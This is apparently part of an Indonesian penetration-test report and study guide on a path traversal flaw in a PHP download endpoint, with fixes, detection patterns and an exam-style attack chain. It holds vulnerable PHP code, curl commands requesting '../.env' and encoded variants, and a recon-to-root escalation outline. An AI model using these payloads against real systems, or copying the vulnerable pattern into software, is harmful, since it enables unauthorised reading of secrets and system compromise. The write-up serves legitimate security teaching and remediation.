Contoh implementasi rentan:

```php
$file = $_GET['file'];
$path = __DIR__ . '/documents/' . $file;

if (file_exists($path)) {
    header(
        'Content-Disposition: attachment; filename="' .
        basename($file) .
        '"'
    );

    readfile($path);
}
```

Root cause:

1. input pengguna digunakan sebagai path;
2. `../` tidak ditolak atau dinormalisasi dengan aman;
3. tidak ada verifikasi canonical path;
4. tidak ada allowlist dokumen;
5. aplikasi memiliki permission membaca `.env`;
6. file sensitif berada dalam jangkauan proses web.

`basename()` pada header tidak memperbaiki keamanan path. Fungsi tersebut hanya memengaruhi nama file yang ditampilkan, sedangkan `readfile()` tetap dapat membaca path traversal.

---

## 19. Rekomendasi Perbaikan

### 19.1 Gunakan ID Dokumen, Bukan Path

Request yang lebih aman:

```text
/download?id=12345
```

Server melakukan lookup:

```text
12345 → /srv/documents/uu-1-2024.pdf
```

Pengguna tidak pernah mengirim path filesystem.

---

### 19.2 Gunakan Allowlist

Contoh sederhana:

```php
$allowedFiles = [
    'uu-1-2024.pdf',
    'panduan.pdf',
];

$file = $_GET['file'] ?? '';

if (!in_array($file, $allowedFiles, true)) {
    http_response_code(404);
    exit('Berkas tidak ditemukan.');
}
```

---

### 19.3 Verifikasi Canonical Path dengan `realpath()`

```php
<?php

$baseDir = realpath('/srv/portrait-documents');
$requested = $_GET['file'] ?? '';

if ($baseDir === false || $requested === '') {
    http_response_code(400);
    exit('Permintaan tidak valid.');
}

$resolved = realpath($baseDir . DIRECTORY_SEPARATOR . $requested);

if (
    $resolved === false ||
    !str_starts_with(
        $resolved,
        $baseDir . DIRECTORY_SEPARATOR
    ) ||
    !is_file($resolved)
) {
    http_response_code(404);
    exit('Berkas tidak ditemukan.');
}

header('Content-Type: application/octet-stream');
header(
    'Content-Disposition: attachment; filename="' .
    basename($resolved) .
    '"'
);
header('X-Content-Type-Options: nosniff');

readfile($resolved);
```

### Mengapa Aman?

- `realpath()` menormalisasi `../`;
- resolved path harus diawali base directory yang diizinkan;
- path harus menunjuk file biasa;
- nama download menggunakan `basename()` dari path yang sudah diverifikasi.

---

### 19.4 Perhatikan Prefix Check

Pemeriksaan berikut tidak cukup:

```php
str_starts_with($resolved, $baseDir)
```

Jika base directory:

```text
/srv/docs
```

path:

```text
/srv/docs-backup/secret
```

juga diawali `/srv/docs`.

Gunakan separator:

```php
$baseDir . DIRECTORY_SEPARATOR
```

---

### 19.5 Pisahkan Secret dari Aplikasi

- simpan `.env` di lokasi dengan permission ketat;
- gunakan secret manager apabila tersedia;
- jangan letakkan backup secret di webroot;
- user web server hanya diberi akses minimum;
- pisahkan credential per environment;
- jangan gunakan credential yang sama untuk aplikasi, database, dan SSH.

---

### 19.6 Rotasi Secret

Karena `.env` telah terekspos, lakukan rotasi:

```text
database password
application key, sesuai prosedur framework
API token
SMTP credential
Redis credential
cloud key
session secret
```

Rotasi harus disertai:

- pembaruan aplikasi;
- invalidasi session atau token lama;
- pengujian konektivitas;
- audit penggunaan credential.

---

### 19.7 Logging dan Detection

Pantau request yang mengandung:

```text
../
..%2F
%2E%2E
%252F
/etc/passwd
.env
/proc/self
```

Contoh indikator pada access log:

```text
GET /download?file=../.env
GET /download?file=..%2F.env
```

Jangan hanya mengandalkan WAF. Root cause tetap harus diperbaiki di aplikasi.

---

## 20. Cleanup dan Penanganan Bukti

Karena tahap awal bersifat read-only, cleanup pada server biasanya tidak diperlukan.

Pada mesin penguji:

```bash
mkdir -p evidence/restricted
mv traversal-env.body \
   evidence/restricted/
chmod 600 evidence/restricted/traversal-env.body
```

Simpan versi teredaksi untuk laporan:

```bash
cp traversal-env-redacted.txt evidence/
```

Hapus credential dari shell history apabila sempat tertulis:

```bash
history
```

Jangan mengirim file `.env` asli melalui email atau kanal yang tidak aman.

Setelah perbaikan, lakukan retest:

```bash
curl --path-as-is -i \
  -H "User-Agent: $UA" \
  "$BASE_URL/download?file=../.env"
```

Hasil yang diharapkan:

```text
HTTP/1.1 400 atau 404
```

Pastikan file valid tetap dapat diunduh.

---

## 21. Troubleshooting untuk Pemula

### 21.1 Response Selalu `404`

Kemungkinan:

- traversal depth salah;
- endpoint melakukan rewrite berbeda;
- file target tidak berada pada lokasi yang diasumsikan;
- payload telah difilter;
- User-Agent atau session dibutuhkan.

Bandingkan dengan baseline file valid.

---

### 21.2 Browser Berhasil, tetapi Curl Gagal

Salin header yang benar-benar diperlukan.

Mulai dari:

```bash
curl --path-as-is -i \
  -H "User-Agent: $UA" \
  "$BASE_URL/download?file=../.env"
```

Jika masih gagal, tambahkan cookie atau header dari browser satu per satu. Hindari menyalin semua header tanpa memahami fungsinya.

---

### 21.3 Response `200` tetapi Body Bukan File

Kemungkinan aplikasi mengembalikan halaman error dengan status `200`.

Periksa:

```bash
file response.body
wc -c response.body
head -n 20 response.body
grep -Ein 'error|not found|tidak ditemukan' response.body
```

---

### 21.4 Encoded Payload Tidak Bekerja

Proxy, web server, dan aplikasi dapat melakukan decoding pada tahap berbeda.

Uji secara terbatas:

```text
../.env
..%2F.env
%2E%2E%2F.env
```

Catat request dan response masing-masing.

---

### 21.5 `/etc/passwd` Tidak Terbaca

Kemungkinan:

- traversal depth salah;
- aplikasi hanya mengizinkan lokasi tertentu;
- absolute path tidak diterima;
- filter memblokir string;
- endpoint menambahkan ekstensi;
- terdapat sandbox atau chroot.

Keberhasilan `.env` tetap merupakan temuan valid.

---

### 21.6 Credential Database Tidak Dapat Digunakan

Kemungkinan:

- database hanya listen pada localhost;
- firewall memblokir;
- `DB_HOST` menggunakan nama internal;
- credential telah dirotasi;
- database menggunakan socket;
- source IP tidak diizinkan.

Hal ini mengurangi kemungkinan pivot, tetapi tidak menghapus dampak kebocoran secret.

---

### 21.7 Berhasil Login Database tetapi Tidak Menemukan RCE

Hal ini normal. Database access dan OS command execution adalah dua hal berbeda.

Dokumentasikan:

- privilege user;
- database yang dapat dibaca;
- tabel sensitif;
- apakah terdapat credential atau token;
- apakah data dapat dimodifikasi.

Jangan memaksakan kesimpulan root apabila tidak ada jalur teknis yang terbukti.

---

## 22. Checklist Pengujian

### Reconnaissance

- [x] Menentukan target dan port
- [ ] Menjalankan service scan
- [ ] Menjalankan directory enumeration
- [x] Menemukan `/download` dan `/download.php`

### Baseline

- [x] Menguji file valid
- [x] Menguji file tidak ditemukan
- [x] Membandingkan status dan body

### Path Traversal

- [x] Menguji `../.env`
- [x] Menguji alias endpoint
- [x] Menguji encoded traversal
- [ ] Menentukan traversal depth
- [ ] Menguji file sistem non-sensitif
- [ ] Menguji `/etc/passwd`
- [ ] Menentukan batas permission proses web

### Source dan Secret Analysis

- [x] Mengidentifikasi variabel database pada `.env`
- [ ] Membaca source endpoint download
- [ ] Mengidentifikasi framework
- [ ] Memeriksa file backup
- [ ] Memeriksa konfigurasi web server
- [ ] Membuat bukti teredaksi

### Chaining

- [ ] Memeriksa port database
- [ ] Memvalidasi credential database
- [ ] Memeriksa privilege database
- [ ] Memeriksa akun administrator aplikasi
- [ ] Memeriksa private key atau credential service
- [ ] Memvalidasi bug lanjutan dari source code

### Initial Access dan Root

- [ ] Memperoleh shell sebagai user non-root
- [ ] Menjalankan `sudo -l`
- [ ] Memeriksa SUID/SGID
- [ ] Memeriksa capabilities
- [ ] Memeriksa cron dan systemd timer
- [ ] Memeriksa writable root scripts
- [ ] Memeriksa local credential reuse
- [ ] Membuktikan `uid=0(root)` secara non-destruktif

### Remediation

- [ ] Mengganti path input dengan document ID
- [ ] Menambahkan allowlist
- [ ] Menambahkan canonical path validation
- [ ] Merotasi credential yang bocor
- [ ] Membatasi permission proses web
- [ ] Menambahkan monitoring
- [ ] Melakukan retest

---

## 23. Ringkasan untuk Ujian

```text
1. Recon
   nmap → dirsearch → temukan /download?file=

2. Baseline
   file valid → 200
   file tidak ada → 404

3. Traversal
   ../.env → 200 → secret bocor

4. Depth
   uji ../../.../etc/hostname atau /etc/passwd

5. Enumerasi
   .env → source code → config web → backup → /proc/self

6. Pivot
   credential DB/admin/key → initial shell

7. Privesc setelah shell
   sudo -l
   SUID
   capabilities
   cron/timer
   writable root script/service
   credential reuse

8. Root proof
   id
   whoami
   id > /tmp/root_proof
```

Rumus hafalan:

```text
BASELINE → TRAVERSAL → SECRET → PIVOT → SHELL → PRIVESC → ROOT
```

---

## 24. Kesimpulan

Endpoint `/download` dan `/download.php` terbukti rentan terhadap path traversal. Payload `../.env` dan varian encoded berhasil mengembalikan file konfigurasi di luar direktori dokumen yang seharusnya.

Temuan yang telah dibuktikan adalah **arbitrary file read dan kebocoran credential database**. Belum terdapat bukti bahwa kerentanan ini secara langsung memberikan command execution atau akses root.

Namun, path traversal dapat menjadi titik awal attack chain yang lebih serius apabila attacker dapat:

- membaca source code dan menemukan kerentanan lanjutan;
- menggunakan credential database;
- memperoleh akun administrator aplikasi;
- membaca private key atau backup;
- mendapatkan shell sebagai user sistem;
- mengeksploitasi kesalahan konfigurasi lokal seperti sudo, SUID, capability, cron, atau service.

Kesimpulan status:

```text
Confirmed       : Path traversal / arbitrary file read
Confirmed       : .env disclosure
Potential       : Database or application compromise
Not confirmed   : Remote Command Execution
Not confirmed   : Initial shell
Not confirmed   : Root access
```

Severity awal adalah **High**. Severity dapat dinaikkan menjadi **Critical** apabila chaining menuju RCE, pengambilalihan akun administrator, kompromi database penuh, atau privilege escalation root berhasil dibuktikan.
